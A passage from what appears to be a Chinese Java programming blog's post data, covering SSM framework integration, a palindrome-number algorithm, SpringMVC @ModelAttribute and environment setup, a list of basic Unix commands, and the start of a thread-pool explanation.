&lt;build&gt; &lt;finalName&gt;SSM&lt;/finalName&gt; &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/plugin&gt; &lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.0&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.22.1&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;version&gt;2.5.2&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt; &lt;version&gt;2.8.2&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;/build&gt;&lt;/project&gt; 编写实体类1234567891011121314151617181920package com.kayleh.domain;import java.io.Serializable;/** * @Author: Wizard * @Date: 2020/4/21 9:06 * * 账户 */public class Account implements Serializable &#123; private Integer id; private String name; private Double money; public Integer getId() &#123; return id; &#125; ......... public void setMoney(Double money) &#123; this.money = money; &#125;&#125; dao接口123456789101112131415package com.kayleh.dao;import com.kayleh.domain.Account;import java.util.List;/** * @Author: Wizard * @Date: 2020/4/21 9:11 * &lt;p&gt; * 账户dao接口 */public interface AccountDao &#123; //查询所有账户 public List&lt;Account&gt; findAll(); //保存账户信息 public void saveAccount(Account account);&#125; 业务service层和实现123456789101112131415161718192021222324252627282930313233package com.kayleh.service;import com.kayleh.domain.Account;import java.util.List;/** * @Author: Wizard * @Date: 2020/4/21 9:16 */public interface AccountService &#123; //查询所有账户 public List&lt;Account&gt; findAll(); //保存账户信息 public void saveAccount(Account account);&#125;-----------------------------------------------------package com.kayleh.service.impl;import com.kayleh.domain.Account;import com.kayleh.service.AccountService;import org.springframework.stereotype.Service;import java.util.List;/** * @Author: Wizard * @Date: 2020/4/21 9:18 */@Service(\"accountService\")public class AccountServiceImpl implements AccountService &#123; public List&lt;Account&gt; findAll() &#123; System.out.println(\"业务层:查询所有账户...\"); return null; &#125; public void saveAccount(Account account) &#123; System.out.println(\"业务层:保存账户...\"); &#125;&#125; Spring整合在resource下创建Spring配置文件 命名空间12345678910111213 xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xsi:schemaLocation=\"http://www.springframework.org/schema/beanshttp://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexthttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/aophttp://www.springframework.org/schema/aop/spring-aop.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd\"&gt; 注解扫描12345&lt;!-- 开启注解的扫描,希望处理service和dao,controller不需要Spring框架去处理,controller注解由SpringMVC处理 --&gt; &lt;context:component-scan base-package=\"com.kayleh\"&gt; &lt;!-- 配置哪些注解不扫描 --&gt; &lt;context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/&gt; &lt;/context:component-scan&gt; 测试1234567891011121314151617181920package com.kayleh.test;import com.kayleh.service.AccountService;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;/** * @Author: Wizard * @Date: 2020/4/21 9:38 */public class TestSpring &#123; @Test public void run1()&#123; //加载配置文件 ApplicationContext ac = new ClassPathXmlApplicationContext(\"classpath:applicationContext.xml\"); //获取对象 AccountService as = (AccountService) ac.getBean(\"accountService\"); //调用方法 as.findAll(); &#125;&#125; 运行测试,成功调用accountService 搭建和测试SpringMVC的开发环境1.在web.xml中配置DispatcherServlet前端控制器12345678910111213141516&lt;!-- 配置前端控制器：服务器启动必须加载,需要加载springmvc.xml配置文件 --&gt;&lt;servlet&gt;&lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;&lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;&lt;!-- 配置初始化参数,创建完DispatcherServlet对象,加载springmvc.xml配置文件 --&gt;&lt;init-param&gt;&lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;&lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt;&lt;/init-param&gt;&lt;!-- 服务器启动的时候,让DispatcherServlet对象创建 --&gt;&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;&lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;&lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;2.在web.xml中配置DispatcherServlet过滤器解决中文乱码12345678910111213&lt;!-- 配置解决中文乱码的过滤器 --&gt;&lt;filter&gt;&lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;&lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;&lt;init-param&gt;&lt;param-name&gt;encoding&lt;/param-name&gt;&lt;param-value&gt;UTF-8&lt;/param-value&gt;&lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;3.创建springmvc.xml的配置文件,编写配置文件12345678910111213141516171819202122232425262728293031&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:mvc=\"http://www.springframework.org/schema/mvc\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beanshttp://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/mvchttp://www.springframework.org/schema/mvc/spring-mvc.xsdhttp://www.springframework.org/schema/contexthttp://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;!-- 开启注解扫描 --&gt; &lt;context:component-scan base-package=\"com.kayleh\"&gt; &lt;context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/&gt; &lt;/context:component-scan&gt; &lt;!--配置的视图解析器对象--&gt; &lt;bean id=\"internalResourceViewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;property name=\"prefix\" value=\"/WEB-INF/pages/\"/&gt; &lt;property name=\"suffix\" value=\".jsp\"/&gt; &lt;/bean&gt; &lt;!--过滤静态资源--&gt; &lt;mvc:resources mapping=\"/CSS/**\" location=\"/CSS/\"/&gt; &lt;mvc:resources mapping=\"/images/**\" location=\"/images/\"/&gt; &lt;mvc:resources mapping=\"/js/**\" location=\"/js/\"/&gt; &lt;!--开启SpringMVC的注解支持--&gt; &lt;mvc:annotation-driven/&gt;&lt;/beans&gt; 测试SpringMVC的框架搭建是否成功1.编写index.jsp和list.jsp编写,超链接 自带的index.jsp没有头部信息，需要重新创建1&lt;a href=\"account/findAll\"&gt;查询所有&lt;/a&gt; 2.创建AccountController类,编写方法,进行测试 12345678910111213141516package cn.kayleh.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;@Controller@RequestMapping(\"/account\")public class AccountController &#123;/*** 查询所有的数据* @return*/@RequestMapping(\"/findAll\")public String findAll() &#123;System.out.println(\"表现层：查询所有账户...\");return \"list\";&#125;&#125; Spring整合SpringMVC的框架 目的：在controller中能成功的调用service对象中的方法. 在项目启动的时候,就去加载applicationContext.xml的配置文件,在web.xml中配置ContextLoaderListener监听器（该监听器只能加载WEB-INF目录下的applicationContext.xml的配置文件）。123456789&lt;!-- 配置Spring的监听器 --&gt;&lt;listener&gt;&lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listenerclass&gt;&lt;/listener&gt;&lt;!-- 配置加载类路径的配置文件 --&gt;&lt;context-param&gt;&lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;&lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt;&lt;/context-param&gt; 在controller中注入service对象,调用service对象的方法进行测试123456789101112131415161718192021package cn.itcast.controller;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import cn.kayleh.service.AccountService;@Controller@RequestMapping(\"/account\")public class AccountController &#123; @Autowired private AccountService accoutService;/*** 查询所有的数据* @return*/@RequestMapping(\"/findAll\")public String findAll() &#123;System.out.println(\"表现层：查询所有账户...\");accoutService.findAll();return \"list\"; &#125;&#125; Spring整合MyBatis框架搭建和测试MyBatis的环境在web项目中编写SqlMapConfig.xml的配置文件，编写核心配置文件,在后面整合进applicationContext.xml后可以删除1234567891011121314151617181920212223&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE configurationPUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\"http://mybatis.org/dtd/mybatis-3-config.dtd\"&gt;&lt;configuration&gt;&lt;environments default=\"mysql\"&gt;&lt;environment id=\"mysql\"&gt;&lt;transactionManager type=\"JDBC\"/&gt;&lt;dataSource type=\"POOLED\"&gt;&lt;property name=\"driver\" value=\"com.mysql.jdbc.Driver\"/&gt;&lt;property name=\"url\" value=\"jdbc:mysql:///ssm\"/&gt;&lt;property name=\"username\" value=\"root\"/&gt;&lt;property name=\"password\" value=\"admin\"/&gt;&lt;/dataSource&gt;&lt;/environment&gt;&lt;/environments&gt;&lt;!-- 使用的是注解 --&gt;&lt;mappers&gt;&lt;!-- &lt;mapper class=\"cn.kayleh.dao.AccountDao\"/&gt; --&gt;&lt;!-- 该包下所有的dao接口都可以使用 --&gt;&lt;package name=\"cn.kayleh.dao\"/&gt;&lt;/mappers&gt;&lt;/configuration&gt; 在AccountDao接口的方法上添加注解，编写SQL语句123456789101112131415161718192021222324252627package com.kayleh.dao;import com.kayleh.domain.Account;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Select;import org.springframework.stereotype.Repository;import java.util.List;/** * @Author: Wizard * @Date: 2020/4/21 9:11 * &lt;p&gt; * 账户dao接口 */@Repositorypublic interface AccountDao &#123; //查询所有账户 @Select(\"select * from account\") public List&lt;Account&gt; findAll(); //保存账户信息 @Insert(\"insert into account(name,money) values (#&#123;name&#125;,#&#123;money&#125;)\") public void saveAccount(Account account);&#125; 编写测试的方法1234567891011121314151617181920package com.kayleh.test;import com.kayleh.service.AccountService;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;/** * @Author: Wizard * @Date: 2020/4/21 9:38 */public class TestSpring &#123; @Test public void run1()&#123; //加载配置文件 ApplicationContext ac = new ClassPathXmlApplicationContext(\"classpath:applicationContext.xml\"); //获取对象 AccountService as = (AccountService) ac.getBean(\"accountService\"); //调用方法 as.findAll(); &#125;&#125; Spring整合MyBatis框架目的：把SqlMapConfig.xml配置文件中的内容配置到applicationContext.xml配置文件中1234567891011121314151617181920 &lt;!--Srping整合MyBatis框架--&gt; &lt;!--配置连接池--&gt; &lt;!--引入外部配置文件--&gt;&lt;!-- &lt;context:property-placeholder location=\"classpath:jdbc.properties\"/&gt;--&gt; &lt;bean id=\"ds\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"com.mysql.jdbc.Driver\"/&gt; &lt;property name=\"jdbcUrl\" value=\"jdbc:mysql:///ssm\"/&gt;&lt;!--省略了localhost:3306--&gt; &lt;property name=\"user\" value=\"root\"/&gt; &lt;property name=\"password\" value=\"admin\"/&gt; &lt;/bean&gt; &lt;!--配置SqlSessionFactory工厂--&gt; &lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"&gt; &lt;property name=\"dataSource\" ref=\"ds\"/&gt; &lt;/bean&gt; &lt;!--配置AccountDao接口所在包--&gt; &lt;bean id=\"mapperScannerConfigurer\" class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\"&gt; &lt;property name=\"basePackage\" value=\"com.kayleh.dao\" /&gt; &lt;/bean&gt; 在AccountDao接口中添加@Repository注解在service中注入dao对象，进行测试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101package com.kayleh.dao;import com.kayleh.domain.Account;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Select;import org.springframework.stereotype.Repository;import java.util.List;/** * @Author: Wizard * @Date: 2020/4/21 9:11 * &lt;p&gt; * 账户dao接口 */@Repositorypublic interface AccountDao &#123; //查询所有账户 @Select(\"select * from account\") public List&lt;Account&gt; findAll(); //保存账户信息 @Insert(\"insert into account(name,money) values (#&#123;name&#125;,#&#123;money&#125;)\") public void saveAccount(Account account);&#125;-------------------------------------------------------------package com.kayleh.service.impl;import com.kayleh.dao.AccountDao;import com.kayleh.domain.Account;import com.kayleh.service.AccountService;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import java.util.List;/** * @Author: Wizard * @Date: 2020/4/21 9:18 */@Service(\"accountService\")public class AccountServiceImpl implements AccountService &#123; @Autowired private AccountDao accountDao; public List&lt;Account&gt; findAll() &#123; System.out.println(\"业务层:查询所有账户...\"); return accountDao.findAll(); &#125; public void saveAccount(Account account) &#123; System.out.println(\"业务层:保存账户...\"); accountDao.saveAccount(account); &#125;&#125;-------------------------------------------------------------package com.kayleh.controller;import com.kayleh.domain.Account;import com.kayleh.service.AccountService;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.xml.ws.RequestWrapper;import java.io.IOException;import java.util.List;/** * @Author: Wizard * @Date: 2020/4/21 9:21 * &lt;p&gt; * 用户web层 */@Controller@RequestMapping(\"/account\")public class AccountController &#123; @Autowired private AccountService accountService; @RequestMapping(\"/findAll\") public String findAll(Model model) &#123; System.out.println(\"表现层:查询所有的账户...\"); List&lt;Account&gt; list = accountService.findAll(); model.addAttribute(\"list\", list); return \"list\"; &#125; 配置Spring的声明式事务管理1234567891011121314151617181920applicationContext.xml &lt;!-- 配置Spring框架声明式事务管理 --&gt; &lt;!-- 配置事务管理器 --&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;property name=\"dataSource\" ref=\"ds\"/&gt; &lt;/bean&gt; &lt;!-- 配置事务通知 --&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"find*\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" isolation=\"DEFAULT\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 配置AOP增强 --&gt; &lt;aop:config&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut=\"execution(* com.kayleh.service.impl.*ServiceImpl.*(..))\"/&gt; &lt;/aop:config&gt; 123456789101112131415/** * 保存 * * @param account * @return */ @RequestMapping(\"/save\") public void save(Account account, HttpServletRequest request, HttpServletResponse response) throws Exception &#123; System.out.println(\"表现层:查询所有的账户...\"); accountService.saveAccount(account); response.sendRedirect(request.getContextPath() + \"/account/findAll\"); return; &#125;","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"palindrome","slug":"回文数","date":"2020-04-19T05:17:57.000Z","updated":"2021-04-11T17:11:28.808Z","comments":true,"path":"palindrome/","link":"","permalink":"https://kayleh.top/palindrome/","excerpt":"什么是回文数？回文数指的是正序和倒序读都是一样的数，例如121从左到右，从右到左读都是121。任何一个自然数与它的倒序数相加，所得的和再与和的倒序数相加，……如此反复进行下去，经过有限次步骤后，最后必定能得到一个回文数。","text":"什么是回文数？回文数指的是正序和倒序读都是一样的数，例如121从左到右，从右到左读都是121。任何一个自然数与它的倒序数相加，所得的和再与和的倒序数相加，……如此反复进行下去，经过有限次步骤后，最后必定能得到一个回文数。 问题：判断一个数是否为回文数，是返回true，否侧抛出false。1234567891011121314151617181920212223242526272829303132@题目来源lettcode利用Java的StringBuilder通过把整数转换为字符串来实现↓import java.util.Scanner;/** * @Author: Wizard * @Date: 2020/4/12 13:14 */public class palindrome &#123; public static boolean ispalindrome(int i) &#123; String str = (new StringBuilder(i + \"\")).reverse().toString(); return (i + \"\").equals(str); &#125; public static void main(String[] args) &#123; while (true) &#123; System.out.println(\"输入需要判断的整数\"); Scanner scanner = new Scanner(System.in); int str1 = scanner.nextInt(); System.out.println(ispalindrome(str1)); &#125; &#125;&#125;/** * 输入需要判断的整数：1 * false * 输入需要判断的整数：12121 * true */ 123456789101112131415161718192021222324252627进阶：不改变整数为字符串通过取整和取余获取整数中的数字进行比较/** * @Author: Wizard * @Date: 2020/4/12 13:14 */public class palindrome &#123; public static boolean ispalindrome(int i) &#123; if(i&lt;0||(i%10==0&amp;&amp;i!=0)) return false; int number = 0; while(i&gt;number)&#123; number = number * 10 + i % 10; i /=10; &#125; return i == number || i==number/10; &#125; public static void main(String[] args) &#123; while (true) &#123; System.out.println(\"输入需要判断的整数\"); Scanner scanner = new Scanner(System.in); int str1 = scanner.nextInt(); System.out.println(ispalindrome(str1)); &#125; &#125;&#125; 微信公众号:每日学习干货↓&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"SpringMVC@ModelAttribute的使用","slug":"【SpringMVC】-@ModelAttribute","date":"2020-04-19T05:04:07.000Z","updated":"2021-04-11T17:11:28.546Z","comments":true,"path":"use-of-springmvcmodelattribute/","link":"","permalink":"https://kayleh.top/use-of-springmvcmodelattribute/","excerpt":"@ModelAttribute？","text":"@ModelAttribute？ @ModelAttribute的原理比较复杂，需要对源码有一定的理解。它可以使被 @ModelAttribute修饰的方法在控制器的处理方法之前调用。但如果@ModelAttribute标注在方法的入参前，它可以从隐含对象中获取隐含的模型数据中获取对象，再将请求参数绑定到对象中，再传入入参。 实际场景：Spring在进行数据库update全字段更新操作提交表单的时候，从页面获取的数据会封装成一个new的pojo对象，没有带的值为null；所以我们只能更新我们提交的数据。ModelAttribute暂时保存表单pojo对象，覆盖数据库保存的pojo对象的数据即可。 1234567891011121314151617181920ModelAttribute提前与目标方法运行/** * @author Kayleh */@Controllerpublic class ModelAttributeTest &#123; @RequestMapping(\"/update\") public String update()&#123; System.out.println(\"页面update的bean对象：\"+bean); &#125; @ModelAttribute public void modelAttribute()&#123; System.out.println(\"ModelAttribute调用了...\"); &#125;===========输出=========ModelAttribute调用了...页面update的bean对象：bean&#123;......&#125; 可以得出：ModelAttribute标注的方法总会在目标方法(update)前执行。ModelAttribute可以取出隐含对象的值1234567891011121314151617@ModelAttribute public void TestModelAttribute(Map&lt;String, Object&gt; map)&#123; POJO pojo = new POJO(\"kayleh\", 1104); map.put(\"value\",pojo); System.out.println(\"modelAttribute方法...); &#125;@RequestMapping(\"/updateBook\") public String updateBook(@RequestParam(value=\"author\")String author, Map&lt;String, Object&gt; model, HttpServletRequest request, @ModelAttribute(\"value\")POJO pojo )&#123; System.out.println(pojo); return \"ok\"; &#125; @ModelAttribute(“value”)这里如果指定的”value”,value就是从map取出参数的key.如果是@ModelAttribute,没有指定key,SpringMVC会默认使用返回值类型的首字母小写作为key.如pOJO.","categories":[{"name":"SpringMVC","slug":"SpringMVC","permalink":"https://kayleh.top/categories/SpringMVC/"}],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"Spring架构","slug":"Spring架构","date":"2020-04-19T04:40:54.000Z","updated":"2021-04-11T17:11:28.451Z","comments":true,"path":"spring-architecture/","link":"","permalink":"https://kayleh.top/spring-architecture/","excerpt":"架构图","text":"架构图","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"unix的常用指令","slug":"unix","date":"2019-12-13T21:30:23.000Z","updated":"2021-04-11T17:11:28.536Z","comments":true,"path":"common-commands-of-unix/","link":"","permalink":"https://kayleh.top/common-commands-of-unix/","excerpt":"unix的常用指令","text":"unix的常用指令 1234567891011121314ls 显示指定目录下的文件目录清单相当于dos下的dir命令。pwd 显示当前目录。mkdir 在当前目录下创建目录。rm 删除文件或目录。cp 复制文件。mv 移动文件。cd 切换工作目录。ps 查看进程。ftp 传送文件。telnet 远程登录命令。ping 用来测试本机与目标主机是否联通。env 查看当前系统中的环境变量。more 分屏显示指定文件的内容。echo在终端上显示你要显示的内容，向C语言中的printf函数。 微信公众号:每日学习干货","categories":[],"tags":[]},{"title":"SpringMVC环境搭建","slug":"SpringMVC环境搭建","date":"2019-07-13T21:30:23.000Z","updated":"2021-04-11T17:11:28.441Z","comments":true,"path":"springmvc-environment-construction/","link":"","permalink":"https://kayleh.top/springmvc-environment-construction/","excerpt":"SpringMVC","text":"SpringMVC 12345Spring MVC是Spring Framework的一部分，是基于Java实现MVC的轻量级Web框架，实现MVC模块，简化了Web开发。MVC提倡每一层只写自己的东西，不写其他任何代码。为了解耦，为了维护方便和分工合作。SpringMVC为展现层提供的基于MVC设计理念的优秀Web框架，是目前最主流的框架之一。 环境搭建1.导包(Maven工程忽略) 需要导入log包，spring核心包，SpringMVC包 1234567891.junit-x.x.x.jar 2.spring-webmvc-x.x.x.RELEASE.jar3.spring-aop-x.x.x.RELEASE.jar4.spring-beans-x.x.x.RELEASE.jar5.spring-context-x.x.x.RELEASE.jar6.spring-core-x.x.x.RELEASE.jar7.spring-expression-x.x.x.RELEASE.jar8.spring-web-x.x.x.RELEASE.jar9.commons-log-.x.x.x.RELEASE.jar 写配置1234567891011121314151617181920212223242526272829303132333435363738394041/** * web.xml */&lt;servlet&gt; &lt;servlet-name&gt;springDispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;!-- contextConfigLocation：指定SpringMVC配置文件位置 --&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springDispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; =========================================================== /** * springmvc.xml */ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd\"&gt; &lt;!-- 这里是扫描所有组件 --&gt; &lt;context:component-scan base-package=\"com.wizard\"&gt;&lt;/context:component-scan&gt; &lt;!-- 配置一个视图解析器 作用是拼接页面的地址，方便调用--&gt; &lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;!--前缀--&gt; &lt;property name=\"prefix\" value=\"/WEB-INF/page/\"&gt;&lt;/property&gt; &lt;!--后缀--&gt; &lt;property name=\"suffix\" value=\".jsp\"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; 12345678910111213141516/**view层*/&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt;&lt;title&gt;Insert title here&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;来了!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 123456789101112131415161718控制器层/** * @author Kayleh * @Controller:标识哪个组件是控制器 *@RequestMapping * 告诉SpringMVC，这个方法用来处理什么请求; */@Controllerpublic class firstController &#123;//这是一次转发操作 @RequestMapping(\"/hello\") public String firstRequest()&#123; System.out.println(\"收到请求\"); return \"success\"; &#125;&#125; 12345678910111213index.jsp&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt;&lt;title&gt;Insert title here&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=\"hello\"&gt;Hello bug&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 运行结果1Hello bug 其他细节细节：@RequestMapping注解不仅可以写在方法前,还可以写在类前,如果写在类前,意思为当前类所有的方法的请求地址指定一个基准路径,访问firstRequest方法的路径为/类前的注解/方法的注解(/hello). @RequestMapping注解的参数(“/hello”)的/可以不写,但习惯为了方便维护应该写上. 控制器处理的请求 firstController 是请求转发操作,Tomcat访问地址栏不变 如果前端控制器没有指定配置文件位置,Spring也会在/WEB-INF/xxx-servlet.xml路径下查找文件.xxx为web.xml配置的前端控制器 详细流程 1.客户端点击链接会发送http://localhost:8080/springmvc/hello请求 2.来到Tomcat服务器 3.springMVC的前端控制器收到所有请求 4.看请求地址和@RequestMapping标注的哪个匹配,来找到使用什么类的什么方法 5.前端控制器找到了目标处理器类和目标方法,直接利用反射执行目标方法 6.方法执行完成之后会有一个返回值;SpringMVC认为这个返回值就是要去的页面 7.拿到方法返回值后,用视图解析器进行拼串得到完整的页面地址 8.拿到页面地址,前端控制器转发到页面 其他问题?1为什么web.xml中配置的拦截为 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;springDispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 为什么没有拦截index.jsp?? 因为Tomcat的底层本来就能拦截jsp页面,配置的”/“的子类web.xml相当于覆盖了Webapp的父类web.xml中的DefaultServlet,DefaultServlet的作用是处理静态资源,覆盖了DefaultServlet,也就拦截了除jsp和servlet外的静态资源,而JspServlet的配置并没有覆盖. 而”/*”的作用是拦截所有请求,包括jsp页面.","categories":[{"name":"SpringMVC","slug":"SpringMVC","permalink":"https://kayleh.top/categories/SpringMVC/"}],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"concurrency-principle","slug":"并发：原理","date":"2018-12-31T21:30:23.000Z","updated":"2021-04-11T17:11:28.864Z","comments":true,"path":"concurrency-principle/","link":"","permalink":"https://kayleh.top/concurrency-principle/","excerpt":"多线程为什么要创建线程池1如果系统要运行多个线程,大量反复的启动创建和回收线程会非常占用系统资源,导致性能下降.","text":"多线程为什么要创建线程池1如果系统要运行多个线程,大量反复的启动创建和回收线程会非常占用系统资源,导致性能下降. 创建线程池,可以:1.降低资源消耗2.提升响应速度3.提高 线程池原理 线程池一般由两种角色构成：多个工作线程 和 一个阻塞队列。 工作线程 :工作线程是一组已经处在运行中的线程，它们不断地向阻塞队列中领取任务执行。 阻塞队列 :阻塞队列用于存储工作线程来不及处理的任务。当工作线程都在执行任务时，到来的新任务就只能暂时在阻塞队列中存储。 1234提交一个任务到线程池中,线程池的处理流程如下:1.判断线程池里的核心线程是否都在执行任务,如果不是(核心线程空闲或者核心线程没有被创建)则创建一个新的工作线程来执行任务.如果核心线程都在执行任务,则进入下个流程.2.线程池判断工作队列是否已满,如果工作路径没有满,则新提交的任务储存在这个工作队列里.如果工作队列满了,则进入下个流程.3.判断线程池里的线程是否都处于工作状态,如果没有,则创建一个新的工作线程来执行任务.如果已经满了,则交给饱和策略来处理这个任务. 线程池的分类1234567public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler); 